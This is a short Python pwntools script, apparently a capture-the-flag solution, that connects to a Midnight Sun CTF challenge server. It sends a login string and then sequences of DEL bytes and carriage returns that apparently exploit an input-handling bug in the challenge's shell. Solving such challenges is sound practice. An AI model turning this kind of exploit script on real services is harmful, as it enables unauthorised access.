#!/usr/bin/env python
# coding=utf-8

from pwn import *
from string import printable

def recvn(n):
    global r
    res = ''
    while n:
        tmp = r.recv(n)
        res += tmp
        n -= len(tmp)
    return res

# context.log_level = 'debug'
# r = process('./run')
r = remote('hfs-os-01.play.midnightsunctf.se', 31337)

r.sendafter('> ', 'sojupwner')
r.recvline()
r.send('\n')
r.recvuntil('> ')
for i in range(9):
    r.send('\x7f')
    recvn(8)
r.send('O\x0d')
r.recvuntil('> ')
r.recvuntil('> ')

for i in range(3):
    r.send('\x7f')
    recvn(8)
r.send('2\x0d')
r.recvuntil('> ')
r.recvuntil('> ')
raw_input('haha')
r.send('exit')
print r.recvall()
